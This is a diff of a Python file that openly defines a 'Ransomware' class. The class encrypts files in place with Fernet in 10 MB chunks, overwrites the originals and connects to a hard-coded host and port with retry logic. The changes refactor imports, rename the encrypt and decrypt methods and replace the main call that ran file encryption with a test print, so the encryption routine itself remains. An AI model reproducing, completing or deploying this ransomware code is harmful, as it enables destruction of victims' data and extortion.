@@ -6,15 +6,18 @@ import shutil
 from time import sleep
 from pathlib import Path
 from typing import Dict, List
-from lib.modules.system import System
-from lib.modules.yaml import safe_load
-from lib.cryptography.fernet import Fernet
+from lib.modules import (
+    Terminal, 
+    safe_load
+)
+from lib.cryptography import Fernet
 
 
-class Ransomware(Fernet):
+class Ransomware():
     
     def __init__(self, host: str, port: int) -> None:
         self.key = Fernet.generate_key()
+        self.fernet = Fernet(self.key)
         self.host = host
         self.port = port
         self.Private = Fernet(self.key)
@@ -32,7 +35,7 @@ class Ransomware(Fernet):
                 if retries < 3:
                     sleep(10)
                 else:
-                    System.reset()
+                    Terminal.reset()
             finally:
                 self.server.close()
 
@@ -60,17 +63,17 @@ class Ransomware(Fernet):
                             chunk = original_file.read(1024 * 1024 * 10)  # Đọc từng phần của tệp
                             if not chunk:
                                 break
-                            processed_chunk = self.encode(chunk) if mode == 'encrypt' else self.decode(chunk)
+                            processed_chunk = self.fernet.encrypt(chunk) if mode == 'encrypt' else self.fernet.decrypt(chunk)
                             temp_file.write(processed_chunk)
                     shutil.move(temp_file.name, file)
                 except Exception:
                     if os.path.exists(temp_file.name):
                         os.remove(temp_file.name)
     
-    def encrypt(self) -> None:
+    def encrypted(self) -> None:
         self.process_files('encrypt')
     
-    def decrypt(self) -> None:
+    def decrypted(self) -> None:
         self.process_files('decrypt')
     
     
@@ -78,4 +81,4 @@ class Ransomware(Fernet):
 
 if __name__ == '__main__':
     bot = Ransomware('192.168.1.12', 19100)
-    bot.encrypt()
+    print(bot.fernet.encrypt('aoividav'.encode()))
